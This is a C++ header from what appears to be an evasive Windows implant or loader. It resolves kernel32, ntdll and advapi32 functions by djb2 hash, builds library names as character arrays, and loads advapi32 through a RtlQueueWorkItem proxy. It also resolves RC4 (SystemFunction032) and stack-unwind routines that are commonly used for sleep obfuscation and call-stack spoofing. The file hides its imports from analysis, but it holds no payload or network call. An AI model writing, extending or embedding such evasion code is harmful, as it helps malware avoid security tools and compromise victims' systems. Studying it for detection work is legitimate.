/* InitializeAPI.h */
#pragma once

#ifndef INITIALIZEAPI_H
#define INITIALIZEAPI_H

#include <Windows.h>
#include "Primitives.h"
#include "Debug.h"
#include "Structs.h"
#include "Common.h"

namespace Win32API {

    inline BOOL InitializeWin32APIs() {

        PVOID                               Kernel32            = nullptr;
        PVOID                               Ntdll               = nullptr;
        PVOID                               AdvApi              = nullptr;
        WCHAR                               AdvStr[]            = { L'a', L'd', L'v', L'a', L'p', L'i', L'3', L'2', L'.', L'd', L'l', L'l', L'\0' };

#ifdef DEBUG
        DBGPRINT("[*] Initializing Win32 APIs \n");
#endif

        if (!(Kernel32 = Resolver::LdrGetModuleByHash(Hash::ExprHashStrDjb2(L"kernel32.dll")))) {
#ifdef DEBUG
            DBGPRINT("[-] LdrGetModuleByHash -> Failed To Get Kernel32 Handle - %s.%d \n", GET_FILENAME(__FILE__), __LINE__);
#endif
            return FALSE;
        }

        if (!(Ntdll = Resolver::LdrGetModuleByHash(Hash::ExprHashStrDjb2(L"ntdll.dll")))) {
#ifdef DEBUG
            DBGPRINT("[-] LdrGetModuleByHash -> Failed To Get Ntdll Handle - %s.%d \n", GET_FILENAME(__FILE__), __LINE__);
#endif
            return FALSE;
        }

        g_Win32.K32.LoadLibraryW = (decltype(g_Win32.K32.LoadLibraryW))Resolver::LdrGetSymbolByHash(Kernel32, Hash::ExprHashStrDjb2("LoadLibraryW"));
        g_Win32.K32.GetModuleHandleW = (decltype(g_Win32.K32.GetModuleHandleW))Resolver::LdrGetSymbolByHash(Kernel32, Hash::ExprHashStrDjb2("GetModuleHandleW"));
        g_Win32.Nt.RtlQueueWorkItem = (decltype(g_Win32.Nt.RtlQueueWorkItem))Resolver::LdrGetSymbolByHash(Ntdll, Hash::ExprHashStrDjb2("RtlQueueWorkItem"));

        if (!g_Win32.K32.LoadLibraryW || !g_Win32.K32.GetModuleHandleW || !g_Win32.Nt.RtlQueueWorkItem)
            return FALSE;

        if (!(AdvApi = Proxy::WorkItemLoadLibrary(AdvStr))) {
#ifdef DEBUG
            DBGPRINT("[-] WorkItemLoadLibrary -> Failed To Load AdvApi - %s.%d \n", GET_FILENAME(__FILE__), __LINE__);
#endif
            return FALSE;
        }

        g_Win32.K32.WaitForSingleObject = (decltype(g_Win32.K32.WaitForSingleObject))Resolver::LdrGetSymbolByHash(Kernel32, Hash::ExprHashStrDjb2("WaitForSingleObject"));

        if (!g_Win32.K32.WaitForSingleObject)
            return FALSE;

        g_Win32.Nt.NtCreateEvent = (decltype(g_Win32.Nt.NtCreateEvent))Resolver::LdrGetSymbolByHash(Ntdll, Hash::ExprHashStrDjb2("NtCreateEvent"));
        g_Win32.Nt.NtQueryInformationProcess = (decltype(g_Win32.Nt.NtQueryInformationProcess))Resolver::LdrGetSymbolByHash(Ntdll, Hash::ExprHashStrDjb2("NtQueryInformationProcess"));
        g_Win32.Nt.NtSetEvent = (decltype(g_Win32.Nt.NtSetEvent))Resolver::LdrGetSymbolByHash(Ntdll, Hash::ExprHashStrDjb2("NtSetEvent"));
        g_Win32.Nt.NtWaitForSingleObject = (decltype(g_Win32.Nt.NtWaitForSingleObject))Resolver::LdrGetSymbolByHash(Ntdll, Hash::ExprHashStrDjb2("NtWaitForSingleObject"));
        g_Win32.Nt.RtlAcquireSRWLockExclusive = (decltype(g_Win32.Nt.RtlAcquireSRWLockExclusive))Resolver::LdrGetSymbolByHash(Ntdll, Hash::ExprHashStrDjb2("RtlAcquireSRWLockExclusive"));
        g_Win32.Nt.RtlAddFunctionTable = (decltype(g_Win32.Nt.RtlAddFunctionTable))Resolver::LdrGetSymbolByHash(Ntdll, Hash::ExprHashStrDjb2("RtlAddFunctionTable"));
        g_Win32.Nt.RtlDeleteFunctionTable = (decltype(g_Win32.Nt.RtlDeleteFunctionTable))Resolver::LdrGetSymbolByHash(Ntdll, Hash::ExprHashStrDjb2("RtlDeleteFunctionTable"));
        g_Win32.Nt.RtlLookupFunctionEntry = (decltype(g_Win32.Nt.RtlLookupFunctionEntry))Resolver::LdrGetSymbolByHash(Ntdll, Hash::ExprHashStrDjb2("RtlLookupFunctionEntry"));
        g_Win32.Nt.RtlReleaseSRWLockExclusive = (decltype(g_Win32.Nt.RtlReleaseSRWLockExclusive))Resolver::LdrGetSymbolByHash(Ntdll, Hash::ExprHashStrDjb2("RtlReleaseSRWLockExclusive"));
        g_Win32.Nt.RtlVirtualUnwind = (decltype(g_Win32.Nt.RtlVirtualUnwind))Resolver::LdrGetSymbolByHash(Ntdll, Hash::ExprHashStrDjb2("RtlVirtualUnwind"));

        if (!g_Win32.Nt.NtCreateEvent || !g_Win32.Nt.NtQueryInformationProcess ||
            !g_Win32.Nt.NtSetEvent || !g_Win32.Nt.RtlAcquireSRWLockExclusive ||
            !g_Win32.Nt.RtlAddFunctionTable || !g_Win32.Nt.RtlDeleteFunctionTable ||
            !g_Win32.Nt.RtlLookupFunctionEntry || !g_Win32.Nt.RtlReleaseSRWLockExclusive ||
            !g_Win32.Nt.RtlVirtualUnwind || !g_Win32.Nt.NtWaitForSingleObject)
            return FALSE;

        g_Win32.AdvApi32.RegCloseKey = (decltype(g_Win32.AdvApi32.RegCloseKey))Resolver::LdrGetSymbolByHash(AdvApi, Hash::ExprHashStrDjb2("RegCloseKey"));
        g_Win32.AdvApi32.RegOpenKeyExW = (decltype(g_Win32.AdvApi32.RegOpenKeyExW))Resolver::LdrGetSymbolByHash(AdvApi, Hash::ExprHashStrDjb2("RegOpenKeyExW"));
        g_Win32.AdvApi32.RegQueryValueExW = (decltype(g_Win32.AdvApi32.RegQueryValueExW))Resolver::LdrGetSymbolByHash(AdvApi, Hash::ExprHashStrDjb2("RegQueryValueExW"));
        g_Win32.AdvApi32.SystemFunction032 = (decltype(g_Win32.AdvApi32.SystemFunction032))Resolver::LdrGetSymbolByHash(AdvApi, Hash::ExprHashStrDjb2("SystemFunction032"));

        if (!g_Win32.AdvApi32.RegCloseKey || !g_Win32.AdvApi32.RegOpenKeyExW || !g_Win32.AdvApi32.RegQueryValueExW || !g_Win32.AdvApi32.SystemFunction032)
            return FALSE;

#ifdef DEBUG
        DBGPRINT("[+] Success \n");
#endif
        return TRUE;
    }
}

#endif
